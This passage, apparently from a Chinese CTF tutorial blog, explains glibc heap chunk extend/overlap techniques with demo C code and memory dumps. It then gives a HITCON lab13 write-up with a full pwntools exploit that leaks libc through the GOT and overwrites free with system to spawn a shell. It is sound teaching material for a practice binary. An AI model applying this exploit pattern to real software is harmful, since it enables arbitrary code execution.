<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x80</span>);<span class="comment">//分配第一个0x80的chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第二个0x10的chunk2</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr);<span class="comment">//首先进行释放，使得chunk1进入unsorted bin</span></span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">int</span>)ptr<span class="number">-0x8</span>)=<span class="number">0xb1</span>;</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>两次 malloc 之后的结果如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000091 &lt;&#x3D;&#x3D;&#x3D; chunk 1</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602050:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602060:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602070:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602080:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602090:   0x0000000000000000  0x0000000000000021 &lt;&#x3D;&#x3D;&#x3D; chunk 2</span><br><span class="line">0x6020a0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020b0:   0x0000000000000000  0x0000000000020f51</span><br></pre></td></tr></table></figure>

<p>我们首先释放 chunk1 使它进入 unsorted bin 中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">     unsorted_bins[0]: fw&#x3D;0x602000, bk&#x3D;0x602000</span><br><span class="line"> →   Chunk(addr&#x3D;0x602010, size&#x3D;0x90, flags&#x3D;PREV_INUSE)</span><br><span class="line"></span><br><span class="line">0x602000:   0x0000000000000000  0x0000000000000091 &lt;&#x3D;&#x3D;&#x3D; 进入unsorted bin</span><br><span class="line">0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602050:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602060:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602070:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602080:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602090:   0x0000000000000090  0x0000000000000020 &lt;&#x3D;&#x3D;&#x3D; chunk 2</span><br><span class="line">0x6020a0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020b0:   0x0000000000000000  0x0000000000020f51 &lt;&#x3D;&#x3D;&#x3D; top chunk</span><br></pre></td></tr></table></figure>

<p>然后篡改 chunk1 的 size 域</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x00000000000000b1 &lt;&#x3D;&#x3D;&#x3D; size域被篡改</span><br><span class="line">0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602050:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602060:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602070:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602080:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602090:   0x0000000000000090  0x0000000000000020</span><br><span class="line">0x6020a0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020b0:   0x0000000000000000  0x0000000000020f51</span><br></pre></td></tr></table></figure>

<p>此时再进行 malloc 分配就可以得到 chunk1+chunk2 的堆块，从而控制了 chunk2 的内容。[^2]</p>
<p>[^2]: 分配的安全检查机制，请看 malloc 函数介绍</p>
<h2 id="Chunk-Extend-Shrink-可以做什么"><a href="#Chunk-Extend-Shrink-可以做什么" class="headerlink" title="Chunk Extend/Shrink 可以做什么"></a>Chunk Extend/Shrink 可以做什么</h2><p>一般来说，这种技术并不能直接控制程序的执行流程，但是<strong>可以控制 chunk 中的内容</strong>。如果 chunk 存在字符串指针、函数指针等，就可以利用这些指针来进行信息泄漏和控制执行流程。</p>
<p>此外<strong>通过 extend 可以实现 chunk overlapping，通过 overlapping 可以控制 chunk 的 fd/bk 指针从而可以实现 fastbin attack 等利用</strong>。</p>
<h2 id="基本示例-4：通过-extend-后向-overlapping"><a href="#基本示例-4：通过-extend-后向-overlapping" class="headerlink" title="基本示例 4：通过 extend 后向 overlapping"></a>基本示例 4：通过 extend 后向 overlapping</h2><p>这里展示通过 extend 进行后向 overlapping，这也是在 CTF 中最常出现的情况，通过 overlapping 可以实现其它的一些利用。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第1个 0x80 的chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第2个 0x10 的chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第3个 0x10 的chunk3</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第4个 0x10 的chunk4    </span></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">int</span>)ptr<span class="number">-0x8</span>)=<span class="number">0x61</span>;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>初始化分配 4 个堆之后：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200801170104.png"></p>
<p>将第一个 chunk size 修改为 0x61 ，然后 free 第一个堆块，红框内的都会被当做一个整体放入到 fastbin 当中：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200801170205.png"></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200801170307.png"></p>
<p>那么当再次分配大小为 0x50 （不含chunk header）时，就会调用这块内存了：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200801171023.png"></p>
<p>在 malloc(0x50) 对 extend 区域重新占位后，其中 0x10 的 fastbin 块依然可以正常的分配和释放，此时已经构成 overlapping，通过对 overlapping 的进行操作可以实现 fastbin attack。</p>
<h2 id="基本示例-5：通过-extend-前向-overlapping"><a href="#基本示例-5：通过-extend-前向-overlapping" class="headerlink" title="基本示例 5：通过 extend 前向 overlapping"></a>基本示例 5：通过 extend 前向 overlapping</h2><p>这里展示通过修改 pre_inuse 域和 pre_size 域实现合并前面（低地址）的块</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr1,*ptr2,*ptr3,*ptr4;</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin1</span></span><br><span class="line">    ptr2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin1</span></span><br><span class="line">    ptr3=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin2</span></span><br><span class="line">    ptr4=<span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//防止与top合并</span></span><br><span class="line">    <span class="built_in">free</span>(ptr1);</span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr4<span class="number">-0x8</span>)=<span class="number">0x90</span>;<span class="comment">//修改pre_inuse域，prev_inuse</span></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr4<span class="number">-0x10</span>)=<span class="number">0xd0</span>;<span class="comment">//修改pre_size域，prev_size</span></span><br><span class="line">    <span class="built_in">free</span>(ptr4);<span class="comment">//unlink进行前向extend</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x150</span>);<span class="comment">//占位块</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里例子调试一直出不来堆信息，就文字描述一下：</p>
<p>先布置好 5 个堆块，然后释放 ptr1 进入到 unsortedbin 。修改 ptr4 的 prev_inuse 为 0 标记前一个堆块释放（空闲）；修改 ptr4 的 prev_size 为 ptr1+ptr2+ptr3 。释放 ptr4 会触发回收机制，也就是合并物理相邻的堆，用到的操作是 unlink ，就将 ptr1~4 当做一个堆块放入 unsortedbin。</p>
<p><strong>前向 extend 利用了 smallbin 的 unlink 机制，通过修改 pre_size 域可以跨越多个 chunk 进行合并实现 overlapping。</strong></p>
<h2 id="HITCON-Trainging-lab13"><a href="#HITCON-Trainging-lab13" class="headerlink" title="HITCON Trainging lab13"></a>HITCON Trainging lab13</h2><p><a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13">题目链接</a></p>
<h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  hitcontraning_lab13 git:(master) file heapcreator</span><br><span class="line">heapcreator: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5e69111eca74cba2fb372dfcd3a59f93ca58f858, not stripped</span><br><span class="line">➜  hitcontraning_lab13 git:(master) checksec heapcreator</span><br><span class="line">[*] &#x27;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/chunk_extend_shrink/hitcontraning_lab13/heapcreator&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>程序为 64 位动态链接程序，主要开启了 Canary 保护与 NX 保护，还有一点就是 <code>RELRO:    Partial RELRO</code> GOT 表可以修改。</p>
<h3 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h3><p>程序是一个堆管理器，有增删查改功能。</p>
<p>每个 content 堆块用一个 0x10 的结构体堆去维护，结构体如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> size;		<span class="comment">//context 大小</span></span><br><span class="line">    _QWORD *chunk;		<span class="comment">//context 指针</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h3><p>edit 、 show 功能都存在 off-by-one ，两者出现逻辑、地方一致，造成影响的 edit ，这里就以 edit 叙述。</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-08-02-7XoD5kSKWk9XAaVb.png"></p>
<p>可以看到 19 行写入数据的时候传入的长度参数被故意加 1 了，造成溢出可控的一字节。</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol>
<li>利用 off-by-one 覆盖下一个 chunk 的 size （这里修改的是结构体 chunk ），伪造 chunk 大小</li>
<li>释放被溢出 chunk 后，申请伪造 chunk ，造成 chunk overlap（堆重叠），从而控制新结构体的指针。</li>
</ol>
<p>先布置好内存空间：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#1</span></span><br></pre></td></tr></table></figure>

<p>chunk0 content 大小要求是用到下一个 chunk 的 prev_size 用于溢出修改下一个 chunk 的 size 。</p>
<p>chunk1 content 大小最好是 0x10 ，这样我们溢出修改、释放 chunk1 后再申请一个 chunk 结构体就会用这个 chunk1 content 空间（为什么不用原来的？[小结](# 小结)）。当然也可以用其他大小，自行调试即可。这里举一个例子：chunk1 content size 0x30 ，溢出修改结构体 size 为：0x71 。</p>
<p>堆结构如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x &#x2F;20gx 0xac4000</span><br><span class="line">0xac4000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0xac4010:	0x0000000000000018	0x0000000000ac4030</span><br><span class="line">0xac4020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0xac4030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xac4040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0xac4050:	0x0000000000000010	0x0000000000ac4070</span><br><span class="line">0xac4060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0xac4070:	0x6262626262626262	0x6262626262626262</span><br><span class="line">0xac4080:	0x0000000000000000	0x0000000000020f81</span><br><span class="line">0xac4090:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>然后修改 chunk0 溢出修改下一个 chunk size，这里把 <code>/bin/sh\x00</code> 也一起写入：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>.ljust(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>) + <span class="string">&quot;\x41&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>修改后 chunk1 结构体就将 chunk1 content 也包含进来了，释放的时候会放入 0x40 的 fastbin 中。</p>
<p>堆结构如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x &#x2F;20gx 0xac4000</span><br><span class="line">0xac4000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0xac4010:	0x0000000000000018	0x0000000000ac4030</span><br><span class="line">0xac4020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0xac4030:	0x0068732f6e69622f	0x6161616161616161</span><br><span class="line">0xac4040:	0x6161616161616161	0x0000000000000041	&#x2F;&#x2F;chunk1 struct</span><br><span class="line">0xac4050:	0x0000000000000010	0x0000000000ac4070</span><br><span class="line">0xac4060:	0x0000000000000000	0x0000000000000021	&#x2F;&#x2F;chunk1 content</span><br><span class="line">0xac4070:	0x6262626262626262	0x6262626262626262</span><br><span class="line">0xac4080:	0x0000000000000000	0x0000000000020f81</span><br><span class="line">0xac4090:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>释放 chunk1</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0xac4060 ◂— 0x0		&#x2F;&#x2F;chunk1 content</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0xac4040 ◂— 0x0		&#x2F;&#x2F;chunk1 struct</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br></pre></td></tr></table></figure>

<p>将这两个空闲堆申请出来，由于 malloc 机制，申请相同大小的 chunk 才会用 fastbin 中空闲内存。0x20 会用作新 chunk 的结构体，0x40 会用作新 chunk 的 content 。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0x30</span>)+p64(free_got))</span><br></pre></td></tr></table></figure>

<p>这里为了方便用 chunk1’ 表示新申请的堆，实际上这个堆序号还是 1 ，堆结构如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x &#x2F;20gx 0xac4000</span><br><span class="line">0xac4000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0xac4010:	0x0000000000000018	0x0000000000ac4030</span><br><span class="line">0xac4020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0xac4030:	0x0068732f6e69622f	0x6161616161616161</span><br><span class="line">0xac4040:	0x6161616161616161	0x0000000000000041	&#x2F;&#x2F;chunk1&#39; content</span><br><span class="line">0xac4050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xac4060:	0x6161616161616161	0x0000000000000021	&#x2F;&#x2F;chunk1&#39; struct</span><br><span class="line">0xac4070:	0x0000000000000030	0x0000000000602018</span><br><span class="line">0xac4080:	0x0000000000000000	0x0000000000020f81</span><br><span class="line">0xac4090:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>然后就是泄露 libc 地址，修改 GOT 表，最后触发 <code>system(&#39;/bin/sh&#39;)</code></p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="comment"># @Email   : skye231@foxmail.com</span></span><br><span class="line"><span class="comment"># @File    : heapcreator.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./heapcreator&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./heapcreator&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size,context</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Heap : &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;heap:&quot;</span>)</span><br><span class="line">	p.send(context)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>,context</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;heap :&quot;</span>)</span><br><span class="line">	p.send(context)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span>():</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># off-by-one</span></span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>.ljust(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>) + <span class="string">&quot;\x41&quot;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">create(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0x30</span>)+p64(free_got))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content : &quot;</span>)</span><br><span class="line"></span><br><span class="line">free_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;free_addr:&quot;</span>+<span class="built_in">hex</span>(free_addr))</span><br><span class="line">libc_base = free_addr - libc.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;system:&quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(system))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ul>
<li>分配大小在 fastbin 范围内的新堆块，需要大小匹配用 fastbin 的空闲堆块。举个例子：fastbin 中有一个 0x20 的空闲堆块，需要分配一个 0x40 堆块，会从 topchunk 中分割 0x40 出来（如果可以）。</li>
</ul>
<h2 id="2015-hacklu-bookstore"><a href="#2015-hacklu-bookstore" class="headerlink" title="2015 hacklu bookstore"></a>2015 hacklu bookstore</h2><p><a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/2015_hacklu_bookstore">题目链接</a></p>
<h3 id="基本信息-1"><a href="#基本信息-1" class="headerlink" title="基本信息"></a>基本信息</h3><p>64 位动态链接的程序。</p>
